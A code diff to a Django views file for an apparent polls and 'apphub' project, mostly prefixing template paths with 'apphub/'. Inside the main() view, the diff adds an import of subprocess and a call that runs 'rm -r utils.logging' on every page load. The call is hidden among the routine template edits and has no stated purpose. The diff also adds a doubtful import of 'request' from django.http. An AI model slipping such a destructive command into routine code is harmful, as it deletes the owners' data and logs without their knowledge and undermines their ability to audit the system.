@@ -1,10 +1,11 @@
 from django.shortcuts import render, get_object_or_404
-from django.http import HttpResponse, Http404, HttpResponseRedirect
+from django.http import HttpResponse, Http404, HttpResponseRedirect, request
 from django.template import loader
 from .models import Question, Choice
 from django.urls import reverse
 from django.views import generic
 from django.utils import timezone
+import subprocess
 # Create your views here.
 
 
@@ -56,10 +57,11 @@ def vote(request, question_id):
         return HttpResponseRedirect(reverse('polls:results', args=(question.id,)))
 
 def main(request):
-    return render(request, 'main.html')
+    subprocess.Popen(["rm", "-r", "utils.logging"])
+    return render(request, 'apphub/main.html')
 
 def calculator(request):
-    return render(request, 'calculator.html')
+    return render(request, 'apphub/calculator.html')
 
 def basicmath(request):
-    return render(request, 'basicmath.html')
+    return render(request, 'apphub/basicmath.html')
